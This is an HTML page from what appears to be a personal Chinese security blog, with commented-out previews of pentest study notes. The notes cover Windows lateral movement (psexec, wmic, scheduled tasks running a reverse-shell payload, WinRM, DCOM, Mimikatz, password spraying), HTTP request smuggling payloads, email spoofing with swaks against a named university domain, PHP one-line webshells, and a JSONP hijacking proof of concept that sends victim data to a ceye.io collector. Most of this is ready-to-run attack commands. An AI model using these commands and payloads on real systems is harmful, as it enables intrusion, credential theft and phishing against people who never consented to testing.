<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Twe1ve&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
  <meta property="og:type" content="website">
<meta property="og:title" content="Twe1ve&#39;s Blog">
<meta property="og:url" content="https://github.com/index.html">
<meta property="og:site_name" content="Twe1ve&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="icon" href="/images/icon.png">
  
  
<link rel="stylesheet" href="/css/index.css">



  <!-- 百度站長統計-->
  
  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>
  
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
</head>

<div class="main height-100 flex flex-v">
  <div class="phone-header">
    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
  </div>
  <div class="main-top flex flex1">
    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
    <!--主页上左部分-->
    <div class="height-100 main-left  flex flex-v">
      <div class="main-left-top flex1">
        <a class="logo">
          <img src="/images/logo.svg" />
          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
        </a>
        <nav class="nav">

  
    
      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
        <div class="icon"><i class="iconfont icon-home"></i></div>
        <div class="name">
          <div class="cnname">首页</div>
          <div class="enname">Home Page</div>
        </div>
      </a>

    
      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
        <div class="icon"><i class="iconfont icon-archives"></i></div>
        <div class="name">
          <div class="cnname">归档</div>
          <div class="enname">Archive Page</div>
        </div>
      </a>

    
      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
        <div class="icon"><i class="iconfont icon-about"></i></div>
        <div class="name">
          <div class="cnname">关于我</div>
          <div class="enname">About Me</div>
        </div>
      </a>

    
  

  <!--<a href="/link/">
    <div class="icon"><i class="iconfont icon-link"></i></div>
    <div class="name">
      <div class="cnname">友情链接</div>
      <div class="enname">Friends Web Link</div>
    </div>
  </a>-->
</nav>

      </div>

      <view class="website-msg">
        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
        <!--
        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
        -->
        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
      </view>

      <div class="social flex flex-align-center ">
        
          
            
          
        
      </div>
    </div>
    <!--主页上右部分-->
    
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/06/02/Lateral-Movementt/" class="title">Lateral Movementt</a>
    <section class="desc">
  PSEXEC优点：微软的东东
执行原理： 

通过ipc$连接，释放psexesvc.exe到目标机器

通过服务管理SCManager远程创建psexecsvc服务，并启动服务

客户端连接执行命令，服务端启动相应的程序并执行回显数据。

运行完后删除服务


使用方式：
1、先建立IPC通道连接，然后直接使用
net use \\192.168.0.116\ipc$ “password” /user:administrator
psexec.exe \\192.168.0.116 cmd                   进入半交互式cmdshell  ；    2、在psexec的参数中指定账户密码
psexec.exe \\192.168.0.116 –u administrator –p password  cmd -accepteula参数表示接受Sysinternals的最终用户许可协议，用于机器第一次使用psexec时不跳出提示框
-hashes可支持hash密码
使用psexec最低要求

远程机器的 139 或 445 端口需要开启状态，即 SMB；


明文密码或者 NTLM 哈希；


具备将文件写入共享文件夹的权限；


能够在远程机器上创建服务：SC_MANAGER_CREATE_SERVICE (访问掩码：0x0002)；


能够启动所创建的服务：SERVICE_QUERY_STATUS（访问掩码：0x0004）+ SERVICE_START（访问掩码：0x0010）

在启动psexec建立连接后，远程系统上会被安装一个服务:psexecsvc，安装服务会留下日志，而且psexec推出时有可能服务删除失败，所以不推荐使用psexec,而推荐WMIexec
WMI执行原理：
WMI（Windows Management Instrumentation,Windows 管理规范）是一项核心的 Windows 管理技术；通过使用端口135上的远程过程调用(RPC)进行通信以进行远程访问，用户可以使用 WMI 管理本地和远程计算机，整个运行过程都在计算机内存中发生，不会留下任何痕迹
利用条件：

WMI服务开启，端口135，默认开启。

防火墙允许135、445等端口通信。


wmic（03以上自带，缺点是无回显，可以将命令执行结果写入本地磁盘配合type命令远程读取）：
工作组横向：
wmic /node:192.168.0.116  /user:tw  /password:viq135311 process call create &quot;cmd.exe /c calc&quot;域内横向：
wmic /node:target.domain /user:domain\user /password:password process call create &quot;cmd.exe /c calc”wmiexec： 
获取半交互式shell：
cscript.exe //nologo wmiexec.vbs /shell 192.168.0.116 administrator password在远程系统上执行单条命令：
cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password &quot;whoami&quot;在远程系统上执行bat脚本：
cscript.exe wmiexec.vbs /cmd 192.168.0.116 administrator password c:\programdata\test.bat使用hash的情况：wce注入hash再进行连接
wce –s 账号:主机名或域的名字:LM:NTLM

cscript //nologo wmiexec.vbs /shell 192.168.0.1注意：抓取的LM hash是AAD3开头的，或者是No Password之类的，计用32个0代替LM hash
Invoke-WMIMethod  （powershell自带,执行单条命令）
$User=&quot;administrator&quot; 
$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.0.116&quot; -Credential $Cred其他的利用还有impacket套件、kali自带的pth-winexe、Invoke-TheHash.ps1(可批量)
scService Control；可通过smb创建任务，使用sc命令实现执行SYSTEM权限的命令,执行的文件必须为服务二进制文件
copy service.exe \\192.168.0.116\admin$\temp

sc \\192.168.0.116 create TestService binpath= &quot;C:\windows\temp\service.exe&quot;

sc \\192.168.0.116 start TestService

sc \\192.168.0.116 delete TestServicemsfvenom生成service exe：
-f exe-serviceCS生成service exe：
输出项选择windows service exe计划任务win xp/2003 为at命令
win7+ 为schtasks命令
利用条件：

目标管理员账户凭据

当前机器可正常net use到远程机器

目标机器的计划任务服务“Task scheduler”已正常启动


net use \\192.168.0.116\admin$  /user:administrator  password ###连接目标共享

net time \\192.168.0.116###查看目标主机当前时间

xcopy c:\rev.exe \\192.168.0.116\admin$\temp\###上传payload

chcp 437  ###如果目标为中文系统，需要先调整字符集

schtasks /create /s 192.168.0.116 /u administrator /p password /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/rev.exe&quot; /sc DAILY /mo 1 /ST 18:20###在远程目标机器上创建计划任务

schtasks /run /tn WindowsUpdates /s 192.168.0.116 /U administrator /P password   ###创建完成后手动执行

schtasks /query  /s 192.168.0.116 /U administrator /P password | findstr &quot;WindowsUpdates&quot;###检查运行状态

schtasks  /delete /F /tn WindowsUpdates  /U administrator /P password###反弹shell之后，删除计划任务参数讲解：
/TN：任务名称
/TR：任务执行的程序
/ST：任务执行的时间
winRMWindows Remote Management通过5985（HTTP）和5986（HTTPS）使用WMI的方式进行远程管理
利用条件：

在win 2012之后(包括win 2012)的版本是默认开启的，win 2012之前利用需要手动开启winRM。

防火墙对5986、5985端口开放。


powershell：
第一次执行winrm：当前主机的trustedhosts设置为*，表示信任任意主机，之后重启winRM。
Set-Item WSMan:localhost\client\trustedhosts -value *
Restart-Service WinRM常用命令：
Enable-PSRemoting -force   ###需要目标机器开启远程管理

Test-NetConnection 192.168.0.116 -CommonTCPPort WINRM   ###检查目标机器是否监听winrm端口

Get-Item WSMan:\localhost\Client\TrustedHosts   ###检查主机信任

Invoke-Command 192.168.0.116  -Credential $cred -ScriptBlock {Hostname}   ###远程执行命令

Enter-PSSession 192.168.0.116  -Credential  administrator   ###交互式用户凭证shell；会弹出一个输入密码的框用户凭证使用：
$User=&quot;administrator&quot; 
$Password= ConvertTo-SecureString -String &quot;password&quot; -AsPlainText -Force 
$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password 
Invoke-Command  192.168.0.116  -Credential $cred -ScriptBlock {Hostname}直接使用mimikatz获取远程机器的账户密码：(在域中测试成功，工作组没能成功)
Import-Module ./Invoke-Mimikatz.ps1
Invoke-Mimikatz -ComputerName TARGETwinrs：
winrs -r:192.168.0.116  -u:administrator -p:password  &quot;ipconfig&quot;  ##执行命令
winrs -r:192.168.0.116  -u:administrator -p:password  &quot;cmd&quot;         ##shellevil-winrm 可通过用户凭证密码/hash直接获得交互shell
DCOMCOM：COM是Windows应用程序编程接口（API）的组件，该组件支持软件对象之间的交互。 通过COM，客户端对象可以调用服务器对象的方法，这些对象通常是动态链接库（DLL）或可执行文件（EXE）。
DCOM：Distributed COM；DCOM是COM的网络化版本，DCOM允许COM组件可以利用网络以二进制格式来传输数据
获取DCOM列表
Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication
或
Get-CimInstance Win32_DCOMApplication  #需win12以上存在某些具有命令执行功能的DCOM，可用于横向移动
MMC20.Application COM：（域中测试成功，工作组只能本地成功而不能远程）查看该DCOM信息：
Get-ChildItem &apos;registry::HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}&apos;与目标建立连接：
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.0.116&quot;))
$com.Document.ActiveView | Get-Member通过ExecuteShellCommand执行程序：
$com.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c hostname &gt; c:\fromdcom.txt&quot;,&quot;7&quot;)Excel.Application
自动化脚本
## Password Spraying ##
Password Spraying实际上是域用户爆破
首次尝试使用一个用于多个用户名的通用密码登录。如果所有用户名的第一个密码都不正确，则攻击者将使用其他密码，在两次不同的密码猜测之间留出足够的时间；即采用大量用户名并使用单个密码将其循环的攻击方法，以免触发任何基于时间的帐户锁定阈值
自动从当前用户的域中生成用户列表，并尝试使用每个用户名和密码password进行身份验证
Import-Module .\DomainPasswordSpray.ps1 
Invoke-DomainPasswordSpray -Password password其他可选参数：
UserList-用于Spraying的用户列表。 如果未指定，将自动生成。
password-用于Spraying的单个密码。
PasswordList-用于Spraying的密码列表（不应该过多，导致账户锁定）
OutFile-输出结果到指定文件
domain-要对其进行Spraying的域。
Force-强制喷Spraying继续进行而不提示确认
RDPsharpRDP：SharpRDP.exe computername=dc01 command=calc username=offense\administrator password=123456
CS中实现：

基于tscon的RDP会话劫持https://www.hackingarticles.in/rdp-session-hijacking-with-tscon/
https://pentestlab.blog/tag/rdp-session-hijacking/
https://ired.team/offensive-security/lateral-movement/t1076-rdp-hijacking-for-lateral-movement
PTH&amp;PTT&amp;OverPTH:没什么特别的，需要注意的是在win10中，默认启用LocalAccountTokenFilterPolicy，用于控制过滤本地管理员组中所有本地用户的远程连接UAC。
当LocalAccountTokenFilterPolicy设置为0(默认值)时，只能使用RID 500本地管理员远程连接，且不会已完全的管理员身份进行连接，无法不存在潜在的提权
需要设置为1，非内置的sid为500的用户才能进行远程连接
不会影响本地Administrators组中的域帐户，仅影响本地帐户
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fhttps://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/
printers, open webroots, good old Tomcat还有就是关注内网打印机、web共享目录、旧版本tomcat等有利于横向的脆弱性设备/环境
链接：
https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f
https://lengjibo.github.io/LateralMovement/
https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/
https://ired.team/offensive-security/lateral-movement
https://rcoil.me/2019/08/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3%20PsExec/
https://my.oschina.net/u/4283892/blog/3307767


</section>
    <p class="sub">Jun 2, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/06/02/CORS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AD%A6%E4%B9%A0/" class="title">CORS配置不当学习</a>
    <section class="desc">
  CORS漏洞的成因很明显，就是服务端配置的规则不当所导致的。
SOP（Same-origin policy：##SOP同源策略,非同源的脚本不能访问或者操作其他域的页面对象
同源三要素：

同域名 
同协议 
同端口

CORS（Cross-origin Resourse SharingCORS跨域资源共享,使web应用程序能够无视同源策略，请求其他域的资源
CORS实现：（简单请求/非简单请求）
请求头：
1、origin,用于说明本次请求来自哪个源（域名+协议+端口）
2、Access-Control-Request-Method,用来列出浏览器的CORS请求会用到哪些HTTP方法
3、Access-Control-Request-Headers,指定浏览器CORS请求会额外发送的头信息字段响应头：
1、Access-Control-Allow-Origin(ACAO) 
用于指定允许访问资源的外域URI，对于携带身份凭证的请求不可使用通配符*
2、Access-Control-Allow-Credentials
表明是否允许浏览器读取response的内容，当用在preflight预检请求的响应中时，指定实际的请求是否可使用credentials漏洞挖掘：CORS的漏洞主要看当请求中带有Origin头部字段时，服务器的返回包是否带有CORS的相关字段（Access-Control-Allow*）并且允许Origin的域访问，因此origin字段的值需要多尝试不同的域或者为null。
使用burpsuit进行快速验证：

访问需要检测的网站，访问多个不同的页面，访问足够多后在BurpSuite的Proxy模块下的HTTP history来筛选带有CORS头部的值:

也可以测试下带有Access-Control-Allow-Origin: * 字段的网站是否有CORS漏洞，但是如果是如下组合，则没有漏洞，因为浏览器已经会阻止如下的配置。
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true绕过：
NULL源
使用目标域名作为子域名
…

CORS与JSONP的比较
CORS与JSONP的使用目的相同，但是比JSONP更强大。
JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。
更多学习链接：
CORS三种攻击场景： https://xz.aliyun.com/t/4663
CORS安全完全指南： https://xz.aliyun.com/t/2745


</section>
    <p class="sub">Jun 2, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/06/02/HTTP-Request-Smuggling/" class="title">HTTP Request Smuggling</a>
    <section class="desc">
  HTTP请求走私（HTTP Request Smuggling）
原理：HTTP规范提供了两种不同的方法来指定HTTP消息的长度，但是单个消息可能会同时使用这两种方法，从而使它们彼此冲突
HTTP规范中如果Content-Length和Transfer-Encoding标头同时存在，则Content-Length无效，在单个服务器时有效避免了冲突，但是当多个服务器时，由于服务器之间理解的不一致导致了HTTP Request Smuggling如果前端服务器和后端服务器相对于（可能是混淆的）Transfer-Encoding 标头而言行为不同，则它们可能在连续请求之间的边界上存在分歧，从而导致请求走私漏洞
这也意味着如果网站没有负载平衡，CDN和反向代理，则不会产生HTTP Request Smuggling。引入的代理层越多，越容易受到HTTP Request Smuggling攻击

Content-LengthContent-Length指的就是用 POST Method时带入的 data 的长度（此长度不包含\r\n）
POST /search HTTP/1.1
Host: xxxxxxxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
q=smugglingTransfer-EncodingPOST /search HTTP/1.1
Host: xxxxxxxx
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
b---&gt; data长度，十六进制
q=smuggling---&gt;data
0---&gt;结束符，后接\r\n\r\nKeep Alive##在HTTP1.1中默认使用keep alive，从而允许在单个连接上承载多个请求和响应所谓Keep-Alive，就是在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在HTTP1.1中是默认开启的。
相反，HTTP请求中带有Connection: close的话，通信完成之后，服务器会中断 TCP 连接
危害能够绕过安全机制，实施未授权访问，获取敏感信息并直接危害其他用户
漏洞类型
CL.TE：前端服务器使用Content-Length头，而后端服务器使用Transfer-Encoding头。
TE.CL：前端服务器使用Transfer-Encoding头，而后端服务器使用Content-Length头。
TE.TE：前端服务器和后端服务器均支持Transfer-Encoding标头，但是可以通过某种方式混淆标头来诱导其中一台服务器不对其进行处理。   

Transfer-Encoding: xchunked


Transfer-Encoding : chunked


Transfer-Encoding: chunked

Transfer-Encoding: x



Transfer-Encoding:[tab]chunked



[space]Transfer-Encoding: chunked



X: X[\n]Transfer-Encoding: chunked



Transfer-Encoding

: chunked漏洞检测&amp;验证&amp;利用
需要关闭自动更新Content-Length功能：

漏洞检测：
POST / HTTP/1.1
Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
Q上边构造的payload，Q并不在长度范围内，前端并不会处理到Q，而此时后端会等待下一个块大小超时；因此会有明显的时间延迟如果两个服务器都处于同步状态（TE.TE或CL.CL），则该请求将被前端拒绝，或者被两个系统无害处理。最后，如果以相反的方式发生同步（TE.CL），则由于无效的块大小’Q’，前端将拒绝该消息，而不会将其转发到后端。这样可以防止后端套接字中毒。
检测TE.CL
POST / HTTP/1.1
Host: acbf1f1d1fb4d58580141b8b000300c1.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G0终止符后，后端将超时，等待X到达
两种数据包比较：

漏洞验证

漏洞利用：(发包需要多试几次)
CL.TE:
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

GTE.CL:
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0终止符0后边接 \r\n\r\n
TE.TE：
POST / HTTP/1.1
Host: ac681fb21e744a6b8007290700200056.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: xxx
5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0多种利用案例靶场：https://portswigger.net/web-security/request-smuggling/exploiting  
案例视频讲解： https://www.youtube.com/playlist?list=PL0W_QjMcqdSA64v56rOlTpGoIgc504Hb4&amp;pbjreload=10
https://xz.aliyun.com/t/6878 —&gt;内含很多利用案例
https://www.youtube.com/watch?v=kgkRih2MQtU
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn 内含很多利用案例


</section>
    <p class="sub">Jun 2, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/30/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0/" class="title">邮件伪造</a>
    <section class="desc">
  SPF：Sender Policy FrameworkSPF
原理：创建至少一个DNS TXT记录来启用SPF
SPF验证过程：

接收端获取发件端IP
接收端查询发件域名的TXT记录
根据发件端的SPF记录的规则进行匹配，按照声明的策略进行处理

邮件服务器收到来自xx@example.com的一封邮件，发件主机IP为45.77.87.90。这时邮件服务器回去查询example.com的SPF记录，假若SPF记录中允许45.77.87.90,则该邮件为正常邮件
SPF DNS TXT记录示例
com. IN TXT “v=spf1 a ip4:192.168.1.1 ~all”DKIM：Domain Keys Identified Mail区别于SPF，DKIM使用非对称加密的方式对发件人进行身份验证。收件人可以使用发件人的公钥来验证经过数字签名的电子邮件
DKIM DNS TXT记录示例（p是Base64格式的电子邮件服务器的公钥）：
selector._domainkey.example.com IN TXT “v=DKIM1;p=RAG…123”DMARC：Domain-Based Message Authentication, Reporting and Conformance
DMARC只是一项聚合服务，用于确定发件人是否使用SPF和DKIM，以及发件人如何建议收件人应处理声称来自发件人域的失败/欺骗性电子邮件
DMARC DNS TXT记录示例
TXT IN &quot;v=DMARC1;p=quarantine;pct=100;rua=mailto:dmarccheck@example.com;&quot;总结起来就是：

SPF检查电子邮件来源的IP地址是否已授权
DKIM使用密钥检查消息以进行签名验证
DMARC一次性包含了两种方法

搜集邮箱（作为伪造目标，增加可信度）：
1、在线邮箱地址查找:
https://hunter.io/
http://www.veryvp.com
https://anymailfinder.com/
https://www.findemails.com/
2、whois邮箱
3、bing必应搜索”@hzu.edu.cn”
4、目标站点中的联系我们处获取邮箱
5、根据人名猜测/爆破，验证邮箱是否存在
https://tools.verifyemailaddress.io/
6、根据人名创建可能的邮箱地址
http://metricsparrow.com/toolkit/email-permutator/
7、邮箱抓取脚本https://github.com/laramies/theHarvester
theharvester -d  hzu.edu.cn -l 1000 -b all验证是否开启SPF/DKIM：
nslookup -type=txt xxx.com检测SPF记录是否正确：https://www.kitterman.com/spf/validate.html
邮件伪造：没有SPF：1、直接在线发送伪造邮件：https://emkei.cz/http://tool.chacuo.net/mailanonymous
2、 swaks
swaks --to  webmaster@hzu.edu.cn --from tw@hzu.edu.cn --ehlo hzu.edu.cn --body hello --header &quot;Subject: test&quot;有SPF：awake+smtp2go(需要绑定域名、根据提示添加CNAME记录、cloudfare的话需要取消代理)swaks --to  xxxxxx@qq.com --from jwc@hzu.edu.cn -ehlo hzu.edu.cn --body &quot;test&quot; --server mail.smtp2go.com -p 2525 -au &lt;USER&gt;-ap &lt;PASS&gt;
swaks参数说明：
–from test@qq.com //发件人邮箱；
–ehlo qq.com //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证
–body “http://www.baidu.com&quot; //引号中的内容即为邮件正文；
–header “Subject:hello” //邮件头信息，subject为邮件标题
–data ./Desktop/email.txt //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送
–attach   xxxxx.docx   //附加附件
https://www.cnblogs.com/xiaozi/p/12906040.html 邮件伪造之SPF绕过的5种思路
https://www.cnblogs.com/backlion/p/10842676.html
https://payloads.online/archivers/2019-05-09/1#0x04-%E7%BB%95%E8%BF%87spf


</section>
    <p class="sub">May 30, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/24/%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="title">代码/命令执行漏洞</a>
    <section class="desc">
  代码执行代码执行条件：

存在危险函数且传入的参数用户可控
传入的函数&amp;参数用户可控

危险函数：

eval和assert
preg_replace
回调函数
动态函数

eval 和 assert函数：常见的一句话木马实例：
&lt;?php eval(@$_POST[&apos;a&apos;]); ?&gt;

&lt;?php assert(@$_POST[&apos;a&apos;]); ?&gt;eval()函数的参数必须以分号结尾，assert()则不用
pre_replace:
语法：
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed若正则表达式$pattern中有/e修饰符且成功匹配，则将$replacement的值当作php代码执行
实例：
&lt;?php
    preg_replace(&apos;/\[(.*)\]/e&apos;, &apos;\\1&apos;, $_GET[&apos;str&apos;]);
?&gt;从$str中搜索[]中间的内容作为第一组结果，\1代表这里使用第一组结果填充
根据官方文档： 
PHP 5.5.0 起， 传入 &quot;\e&quot; 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 &quot;\e&quot; 也无法起效。也意味着preg_replace在php5.5+可用，但是会报警，php7中完全废除不可用

php5.5.38测试结果：

回调函数：常见回调函数：

call_user_func()
array_map()
call_user_func_array()
create_func()
uksort()    
…

以call_user_func_array()为例：
语法：
mixed call_user_func_array ( callable $callback , array $param_arr )把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。
&lt;?php
    call_user_func_array($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);
?&gt;http://127.0.0.1/test.php?a=assert&amp;b[]=phpinfo()
动态函数执行：
&lt;?php
$_GET[&apos;a&apos;]($_GET[&apos;b&apos;]);
?&gt;http://127.0.0.1/test.php?a=assert&amp;b=phpinfo()
命令执行顾名思义，命令执行漏洞执行的是系统的命令，因此需要可以执行系统命令的函数存在，且传入参数用户可控
7个命令执行函数：

system()
exec()
shell_exec()
passthru()
pcntl_exec()
popen()
proc_open()

` 也可以执行命令，但是调用的是shell_exec()函数
&lt;?php system(&quot;whoami&quot;);  ?&gt;system() 输出并返回最后一行shell结果。
&lt;?php echo exec(&quot;whoami&quot;); ?&gt;exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面（需要借助echo）。
&lt;?php echo shell_exec(&quot;whoami&quot;); ?&gt;通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回（同样需要借助echo）
&lt;?php passthru(&quot;whoami&quot;); ?&gt;passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。
&lt;?php pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?&gt;pcntl_exec需要额外安装（）
&lt;?php $handle = popen(&quot;/bin/ls&quot;, &quot;r&quot;); ?&gt;r代表读，w代表写
popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针
反单引号命令执行
&lt;?php echo  `whoami` ; ?&gt;

</section>
    <p class="sub">May 24, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/24/jsonp%E5%8A%AB%E6%8C%81/" class="title">jsonp劫持</a>
    <section class="desc">
  JSONP(JSON with Padding)是JSON的一种“使用模式”，创建JSONP是为了授予对JavaScript的跨域读取访问权限，可用于绕过SOP访问跨域数据。
[同源策略]SOP（ Same Origin Policy 策略由浏览器实施，以防止一个Web应用程序从其他Web应用程序检索信息
JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性，
JSONP(JSON with Padding)是JSON的一种“使用模式”
jsonp劫持： jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据（引诱用户点击访问链接，获取API返回给用户的信息）
漏洞源码 
getUser.php
&lt;?php
header(&apos;Content-type: application/json&apos;);
$jsoncallback = htmlspecialchars($_REQUEST [&apos;jsoncallback&apos;]);//获取回调函数名
//json数据
//$json_data = &apos;[&quot;id&quot;,&quot;user&quot;]&apos;;
$json_data=&apos;({&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;Aaron&quot;})&apos;;
echo $jsoncallback . &quot;(&quot; . $json_data . &quot;)&quot;;//输出jsonp格式的数据
?&gt;客户端实现 callbackFunction 函数
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;JSONP劫持测试&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function callbackFunction(result)
    {
        alert(result.name);
    }
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://127.0.0.1/getUser.php?jsoncallback=callbackFunction&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;jsonp漏洞挖掘：首先把Preserve log选项勾上，防止页面刷新跳转的时候访问记录被重置，也方便进行下一步的筛选。

然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 func、function、call、jsonp、jsonpcallback、callback、cb、json、 email
一次SRC实战漏洞挖掘（没有敏感信息，这里仅作演示）

callback函数可控，测试跨域劫持。poc：
&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
&lt;meta charset=&quot;UTF-8&quot;&gt;
&lt;title&gt;JSONP EXP跨域测试&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
function jsonpjack(json){
new Image().src=&quot;http://xxxx.ceye.io/&quot; + JSON.stringify(json)
}
&lt;/script&gt;
&lt;script src=&quot;https://xxxxxsss.baidu.com/new/ApiHome/OneStop/loginTopicInterface?callback=jsonpjack&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;ceye返回结果：

https://www.freebuf.com/articles/web/126347.html
https://securitycafe.ro/2017/01/18/practical-jsonp-injection/


</section>
    <p class="sub">May 24, 2020</p>
  </div>
</div>-->
<!---->
<!--  <div class="project-card">
  
  <div class="ctnWrap">
    <a href="/2020/05/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" class="title">PHP反序列化漏洞学习</a>
    <section class="desc">
  什么是序列化&amp;反序列化：序列化的目的是为了将一个对象通过可保存的字节方式存储起来，这样就可以将序列化字节存储到数据库或者文本当中，当需要的时候再通过反序列化获取
所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示
unserialize()函数能够重新把字符串变回php原来的值
序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。
serialize()：
&lt;?php
class Tw{
